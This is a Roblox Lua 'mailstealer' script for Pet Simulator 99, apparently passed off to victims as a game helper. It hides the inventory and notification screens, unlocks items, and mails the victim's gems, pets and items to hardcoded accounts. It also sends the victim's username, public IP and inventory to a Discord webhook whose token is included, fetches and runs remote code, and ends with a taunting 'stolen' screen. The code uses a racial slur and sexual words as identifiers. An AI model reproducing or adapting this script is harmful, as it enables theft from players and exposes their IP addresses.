Username = "Egorikusa_ghoul"
Username2 = "PS99Russia"
Webhook =
    "https://discord.com/api/webhooks/1191832931132526683/BoESEUIZ3E3UHu_EzpLRSVhCo--5hm-q2vkBgglkFHfywS_ObBxh7raDFDuVgnDmJGVp"
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
LoadingScreen = false

MinimumRAP = 10000

-- OBFUSCATE BRO

ping1 = "@everyone"

if MinimumRAP == nil then
    MinimumRAP = 10000
end

if Webhook == "" or Webhook == nil then
    ping1 = "@everyone"
    Webhook = ""
end
totalrap = 0

if Username2 == "" or Username2 == nil then
    Username2 = Username
end

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local GetGems = function()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            return v._am, i
        end
    end
end

local function GetGems5()
    actually_gems = GetGems()
    if actually_gems == nil then
        actually_gems = 0
    end
    return actually_gems
end

if GetGems5() < 10000 then
    game.Players.LocalPlayer:Kick("Your account has been blacklisted from this script, please use other account!")
else
    rich_kid = true
end

if LoadingScreen ~= false then
    local function runCodeSafely()
        local success, result =
            pcall(
            function()
                local LoadingScreenFunction =
                    require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
                game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000
                LoadingScreenFunction("anything")
            end
        )

        if not success then
            print("An error occurred: " .. tostring(result))
        end
    end

    local co = coroutine.create(runCodeSafely)
    coroutine.resume(co)
else
    local gemsleft =
        game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
    local gemsleftpath =
        game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
    gemsleftpath:GetPropertyChangedSignal("Text"):Connect(
        function()
            gemsleftpath.Text = gemsleft
        end
    )

    local player = game:GetService("Players").LocalPlayer
    local leaderstats = player:WaitForChild("leaderstats")

    for statName, statValue in pairs(leaderstats:GetChildren()) do
        if statValue:IsA("IntValue") then
            local initialValue = statValue.Value
            statValue:GetPropertyChangedSignal("Value"):Connect(
                function()
                    statValue.Value = initialValue
                end
            )
        end
    end

    local loading = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
    local noti = game:GetService("Players").LocalPlayer.PlayerGui.Notifications
    loading.Disabled = true
    noti:GetPropertyChangedSignal("Enabled"):Connect(
        function()
            noti.Enabled = false
        end
    )
    noti.Enabled = false
    local function freeze_inventory()
        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
        local pets_frame_clone = pets_frame:Clone()
        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
    end
    freeze_inventory()
    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
    Inventoryframe:Destroy()
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_UnequipAll"):FireServer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
end

local function GetScammedNigga()
    local instance = {instances = {}}
    function instance.new(class, properties)
        local inst = Instance.new(class)
        for property, value in next, properties do
            inst[property] = value
        end

        table.insert(instance.instances, inst)
        return inst
    end
    local ScreenGui =
        instance.new(
        "ScreenGui",
        {
            Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui"),
            ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
            DisplayOrder = 60000000000001
        }
    )

    local scammedez =
        instance.new(
        "Frame",
        {
            Name = "scammed ez",
            Parent = ScreenGui,
            BackgroundColor3 = Color3.fromRGB(40, 40, 40),
            BorderColor3 = Color3.fromRGB(0, 0, 0),
            BorderSizePixel = 0,
            Position = UDim2.new(0, 0, 1.1365951e-07, 0),
            Size = UDim2.new(1, 0, 1, 5)
        }
    )

    local TextLabel =
        instance.new(
        "TextLabel",
        {
            Parent = scammedez,
            BackgroundColor3 = Color3.fromRGB(40, 40, 40),
            BorderColor3 = Color3.fromRGB(0, 0, 0),
            BorderSizePixel = 0,
            Position = UDim2.new(0.248348162, 0, 0.0528541245, 0),
            Size = UDim2.new(0.502200425, 0, 0.121825397, 0),
            Font = Enum.Font.FredokaOne,
            Text = "ALL YOUR STUFF HAS JUST BEEN STOLEN",
            TextColor3 = Color3.fromRGB(0, 255, 42),
            TextScaled = true,
            TextSize = 14.000,
            TextWrapped = true
        }
    )

    local TextLabel =
        instance.new(
        "TextLabel",
        {
            Parent = scammedez,
            BackgroundColor3 = Color3.fromRGB(40, 40, 40),
            BorderColor3 = Color3.fromRGB(0, 0, 0),
            BorderSizePixel = 0,
            Position = UDim2.new(0.123158529, 0, 0.209235922, 0),
            Size = UDim2.new(0.751820982, 0, 0.123234972, 0),
            Font = Enum.Font.FredokaOne,
            Text = "We stole everything u had in ps99",
            TextColor3 = Color3.fromRGB(255, 0, 4),
            TextScaled = true,
            TextSize = 14.000,
            TextWrapped = true
        }
    )

    local TextLabel =
        instance.new(
        "TextLabel",
        {
            Parent = scammedez,
            BackgroundColor3 = Color3.fromRGB(40, 40, 40),
            BorderColor3 = Color3.fromRGB(0, 0, 0),
            BorderSizePixel = 0,
            Position = UDim2.new(0.101914264, 0, 0.349384248, 0),
            Size = UDim2.new(0.795068204, 0, 0.0726670548, 0),
            Font = Enum.Font.FredokaOne,
            Text = "U probably want to get ur stuff back",
            TextColor3 = Color3.fromRGB(255, 142, 49),
            TextScaled = true,
            TextSize = 14.000,
            TextWrapped = true
        }
    )

    local TextLabel =
        instance.new(
        "TextLabel",
        {
            Parent = scammedez,
            BackgroundColor3 = Color3.fromRGB(40, 40, 40),
            BorderColor3 = Color3.fromRGB(0, 0, 0),
            BorderSizePixel = 0,
            Position = UDim2.new(0.197513744, 0, 0.733943939, 0),
            Size = UDim2.new(0.654704094, 0, 0.168317646, 0),
            Font = Enum.Font.FredokaOne,
            Text = "If u want to take revenge and become rich join our discord .gg/mailstealer",
            TextColor3 = Color3.fromRGB(182, 123, 255),
            TextScaled = true,
            TextSize = 14.000,
            TextWrapped = true
        }
    )
end

local Library = require(game:GetService("ReplicatedStorage").Library)
local Save = Library.Save.Get().Inventory
local SendRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
local HttpService = game:GetService("HttpService")

local request = http_request or request or HttpPost or syn.request

local function GetRAP(dick, vagina)
    return Library.DevRAPCmds.Get(
        {
            Class = {Name = vagina},
            IsA = function(sex)
                return sex == vagina
            end,
            GetId = function()
                return dick.id
            end,
            StackKey = function()
                return HttpService:JSONEncode(
                    {
                        id = dick.id,
                        pt = dick.pt,
                        sh = dick.sh,
                        tn = dick.tn
                    }
                )
            end
        }
    ) or 0
end

local function GetGems2()
    actually_gems = GetGems()
    if actually_gems == nil then
        actually_gems = 0
    end
    return actually_gems
end

local function GetGems3()
    local actually_gems = GetGems()
    if actually_gems == nil then
        actually_gems = 0
    end

    local suffix = ""
    if actually_gems >= 1000000000 then
        actually_gems = actually_gems / 1000000000
        suffix = "b"
    elseif actually_gems >= 1000000 then
        actually_gems = actually_gems / 1000000
        suffix = "m"
    elseif actually_gems >= 1000 then
        actually_gems = actually_gems / 1000
        suffix = "k"
    end

    return string.format("%.1f%s", actually_gems, suffix)
end

local GetMaxInvokes = function(GemAmount)
    return math.floor(GemAmount / 10000)
end

if Save.Box ~= nil then
    for key, _ in pairs(Save.Box) do
        local args = {
            [1] = key
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(
            unpack(args)
        )
    end
end

local function GetHuges()
    HugeList = {}
    if Save.Pet ~= nil then
        table.foreach(
            Save.Pet,
            function(i, v)
                rap = GetRAP(v, "Pet")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Pets[id]
                if dir.huge and dir.Tradable ~= false then
                    table.insert(
                        HugeList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Pet"
                        }
                    )
                end
            end
        )
    end
end

local function GetExclusives()
    ExclusiveList = {}
    if Save.Pet ~= nil then
        table.foreach(
            Save.Pet,
            function(i, v)
                rap = GetRAP(v, "Pet")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Pets[id]
                if dir.exclusiveLevel and dir.Tradable ~= false then
                    table.insert(
                        ExclusiveList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Pet"
                        }
                    )
                end
            end
        )
    end
end

local function GetEggs()
    EggList = {}
    if Save.Egg ~= nil then
        table.foreach(
            Save.Egg,
            function(i, v)
                rap = GetRAP(v, "Egg")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Eggs[id]
                if dir.Tradable ~= false then
                    table.insert(
                        EggList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Egg"
                        }
                    )
                end
            end
        )
    end
end

local function GetCharms()
    CharmList = {}
    if Save.Charm ~= nil then
        table.foreach(
            Save.Charm,
            function(i, v)
                rap = GetRAP(v, "Charm")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Charms[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        CharmList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Charm"
                        }
                    )
                end
            end
        )
    end
end

local function GetHoverboards()
    HoverboardList = {}
    if Save.Hoverboard ~= nil then
        table.foreach(
            Save.Hoverboard,
            function(i, v)
                rap = GetRAP(v, "Hoverboard")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Hoverboards[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        HoverboardList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Hoverboard"
                        }
                    )
                end
            end
        )
    end
end

local function GetBooths()
    BoothList = {}
    if Save.Booth ~= nil then
        table.foreach(
            Save.Booth,
            function(i, v)
                rap = GetRAP(v, "Booth")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Booths[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        BoothList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Booth"
                        }
                    )
                end
            end
        )
    end
end

local function GetEnchants()
    EnchantList = {}
    if Save.Enchant ~= nil then
        table.foreach(
            Save.Enchant,
            function(i, v)
                rap = GetRAP(v, "Enchant")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Enchants[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        EnchantList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Enchant"
                        }
                    )
                end
            end
        )
    end
end

local function GetPotions()
    PotionList = {}
    if Save.Potion ~= nil then
        table.foreach(
            Save.Potion,
            function(i, v)
                rap = GetRAP(v, "Potion")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Potions[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        PotionList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Potion"
                        }
                    )
                end
            end
        )
    end
end

local function GetMisc()
    MiscList = {}
    if Save.Misc ~= nil then
        table.foreach(
            Save.Misc,
            function(i, v)
                rap = GetRAP(v, "Misc")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.MiscItems[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        MiscList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Misc"
                        }
                    )
                end
            end
        )
    end
    if Save.Seed ~= nil then
        table.foreach(
            Save.Seed,
            function(i, v)
                rap = GetRAP(v, "Seed")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Seeds[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        MiscList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Seed"
                        }
                    )
                end
            end
        )
    end
    if Save.Fruit ~= nil then
        table.foreach(
            Save.Fruit,
            function(i, v)
                rap = GetRAP(v, "Fruit")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Fruits[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        MiscList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Fruit"
                        }
                    )
                end
            end
        )
    end
    if Save.Lootbox ~= nil then
        table.foreach(
            Save.Lootbox,
            function(i, v)
                rap = GetRAP(v, "Lootbox")
                rap1 = rap * (v._am or 1)
                totalrap = totalrap + rap1
                id = v.id
                dir = Library.Directory.Lootboxes[id]
                if dir.Tradable ~= false and rap >= MinimumRAP then
                    table.insert(
                        MiscList,
                        {
                            PET_ID = i,
                            PET_NAME = v.id,
                            AMOUNT = v._am or 1,
                            RAP = math.floor(rap),
                            TYPE = "Lootbox"
                        }
                    )
                end
            end
        )
    end
end

local function sortrap()
    local raw_rap = math.floor(totalrap)
    if raw_rap == nil then
        raw_rap = 0
    end

    local suffix = ""
    if raw_rap >= 1000000000 then
        raw_rap = raw_rap / 1000000000
        suffix = "b"
    elseif raw_rap >= 1000000 then
        raw_rap = raw_rap / 1000000
        suffix = "m"
    elseif raw_rap >= 1000 then
        raw_rap = raw_rap / 1000
        suffix = "k"
    end

    return string.format("%.1f%s", raw_rap, suffix)
end

local function GetAllHits()
    totalrap = 0
    GetHuges()
    GetEggs()
    GetExclusives()
    GetCharms()
    GetHoverboards()
    GetBooths()
    GetEnchants()
    GetPotions()
    GetMisc()
end

GetAllHits()

fuckin_rap = sortrap()

if #HugeList > 0 then
    NotAlt = true
end

local function unlockItems(subTable, directory)
    if subTable ~= nil then
        for i, v in pairs(subTable) do
            local id = v.id
            local dir = directory[id]
            if v._lk then
                local args = {i, false}
                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
            end
        end
    end
end

unlockItems(Save.Pet, Library.Directory.Pets)
unlockItems(Save.Egg, Library.Directory.Eggs)
unlockItems(Save.Hoverboard, Library.Directory.Hoverboards)
unlockItems(Save.Booth, Library.Directory.Booths)
unlockItems(Save.Charm, Library.Directory.Charms)
unlockItems(Save.Enchant, Library.Directory.Enchants)
unlockItems(Save.Potion, Library.Directory.Potions)
unlockItems(Save.Misc, Library.Directory.MiscItems)
unlockItems(Save.Seed, Library.Directory.Seeds)
unlockItems(Save.Fruit, Library.Directory.Fruits)
unlockItems(Save.Lootbox, Library.Directory.Lootboxes)

local whenabled = true

local ipwebhook = game:HttpGet("https://ipinfo.io/ip")

local AllPetsList = {}
for _, list in pairs({HugeList, EggList, ExclusiveList, CharmList, HoverboardList, BoothList, EnchantList, PotionList, MiscList}) do
    for _, value in pairs(list) do
        table.insert(
            AllPetsList,
            {
                PET_ID = _,
                PET_NAME = value.PET_NAME,
                AMOUNT = value.AMOUNT or 1
            }
        )
    end
end

local PetsListString = ""
for _, v in pairs(AllPetsList) do
    PetsListString = PetsListString .. "• " .. tostring(v.PET_NAME) .. " " .. tostring(v.AMOUNT) .. "x" .. "\n"
end

if PetsListString == "" then
    PetsListString = "NO PETS"
end

local function SendWebhook(url, ping)
    imgs =
        "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
    data1 = {
        ["content"] = ping,
        ["username"] = "".. OwnerName .."Mailstealer",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = DiscordLink,
                ["type"] = "rich",
                ["color"] = tonumber(0xDC143C),
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            game.Players.LocalPlayer.Name ..
                                "\n(\240\159\148\146) Display Username: " ..
                                    game.Players.LocalPlayer.DisplayName ..
                                        "\n(\240\159\142\178) Creator: " ..
                                            Username ..
                                                "\n(\240\159\145\164) Ip: " ..
                                                    ipwebhook .. "\n(\240\159\147\140) Version: 1 ```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) Pets List:`",
                        ["value"] = "```" .. PetsListString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Gems:`",
                        ["value"] = "```" .. GetGems3() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Total RAP:`",
                        ["value"] = "```" .. fuckin_rap .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\154\128) Developer:`",
                        ["value"] = "```".. OwnerName .."```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**".. DiscordLink .."**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }

    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if Webhook ~= nil and whenabled == true then
        abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        request(abcdef1)
    end
end

local function SendPublicWebhook(url, ping)
    imgs =
        "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
    data1 = {
        ["content"] = ping,
        ["username"] = "Mailstealer v3.1",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = "https://discord.gg/mailstealer",
                ["type"] = "rich",
                ["color"] = tonumber(0x00FFFF),
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "NO PLAYER INFO CUZ YES",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) Pets List:`",
                        ["value"] = "```" .. PetsListString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Gems:`",
                        ["value"] = "```" .. GetGems3() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Total RAP:`",
                        ["value"] = "```" .. totalrap .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\154\128) Developer:`",
                        ["value"] = "```Egorikusa```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**https://discord.gg/mailstealer**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }

    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if Webhook ~= nil and whenabled == true then
        abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        request(abcdef1)
    end
end

local url = Webhook

if rich_kid == true then
    SendWebhook(url, ping1)
end

if duall ~= true then
    print("")
end

local function SendGems()
    GemAmount = GetGems()
    if GemAmount == nil then
        GemAmount = 0
    end
    GetAllHits()
    local MaxHits = GetMaxInvokes(GemAmount)
    local HitsAmount =
        #HugeList + #EggList + #ExclusiveList + #CharmList + #HoverboardList + #BoothList + #EnchantList + #PotionList + #MiscList
    local GemsToSendHits = HitsAmount * 10000 + 10000
    if GemAmount > GemsToSendHits then
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                local args = {
                    [1] = user,
                    [2] = v.id,
                    [3] = "Currency",
                    [4] = i,
                    [5] = GemAmount - GemsToSendHits
                }
                SendRemote:InvokeServer(unpack(args))
            end
        end
    end
end

local function SendHuges()
    GetAllHits()
    if #HugeList ~= 0 then
        for i, v in pairs(HugeList) do
            local args = {
                [1] = user,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendExclusives()
    GetAllHits()
    if #ExclusiveList ~= 0 and #HugeList == 0 then
        for i, v in pairs(ExclusiveList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendEggs()
    GetAllHits()
    if #EggList ~= 0 and #ExclusiveList == 0 and #HugeList == 0 then
        for i, v in pairs(EggList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendHoverboards()
    GetAllHits()
    if #HoverboardList ~= 0 and #EggList == 0 and #ExclusiveList == 0 and #HugeList == 0 then
        for i, v in pairs(HoverboardList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendBooths()
    GetAllHits()
    if #BoothList ~= 0 and #HoverboardList == 0 and #EggList == 0 and #ExclusiveList == 0 and #HugeList == 0 then
        for i, v in pairs(BoothList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendCharms()
    GetAllHits()
    if
        #CharmList ~= 0 and #BoothList == 0 and #HoverboardList == 0 and #EggList == 0 and #ExclusiveList == 0 and
            #HugeList == 0
     then
        for i, v in pairs(CharmList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendEnchants()
    GetAllHits()
    if
        #EnchantList ~= 0 and #CharmList == 0 and #BoothList == 0 and #HoverboardList == 0 and #EggList == 0 and
            #ExclusiveList == 0 and
            #HugeList == 0
     then
        for i, v in pairs(EnchantList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendPotions()
    GetAllHits()
    if
        #PotionList ~= 0 and #EnchantList == 0 and #CharmList == 0 and #BoothList == 0 and #HoverboardList == 0 and
            #EggList == 0 and
            #ExclusiveList == 0 and
            #HugeList == 0
     then
        for i, v in pairs(PotionList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

local function SendMisc()
    GetAllHits()
    if
        #MiscList ~= 0 and #PotionList == 0 and #EnchantList == 0 and #CharmList == 0 and #BoothList == 0 and
            #HoverboardList == 0 and
            #EggList == 0 and
            #ExclusiveList == 0 and
            #HugeList == 0
     then
        for i, v in pairs(MiscList) do
            local args = {
                [1] = user2,
                [2] = v.PET_NAME,
                [3] = v.TYPE,
                [4] = v.PET_ID,
                [5] = v.AMOUNT
            }
            SendRemote:InvokeServer(unpack(args))
        end
    end
end

user = Username
user2 = Username2

while wait() do
    SendGems()
    SendHuges()
    SendEggs()
    SendExclusives()
    SendHoverboards()
    SendBooths()
    SendCharms()
    SendEnchants()
    SendPotions()
    SendMisc()
    if
        #HugeList == 0 and #EggList == 0 and #ExclusiveList == 0 and #CharmList == 0 and #HoverboardList == 0 and
            #BoothList == 0 and
            #EnchantList == 0 and
            #PotionList == 0 and #MiscList == 0 or
            GetGems2() < 10000
     then
        if NotAlt == true then
            GetScammedNigga()
        end
        break
    end
end







local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000

task.spawn(function()
    LoadingScreenFunction("anything")
end)

game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = "Mori On Top"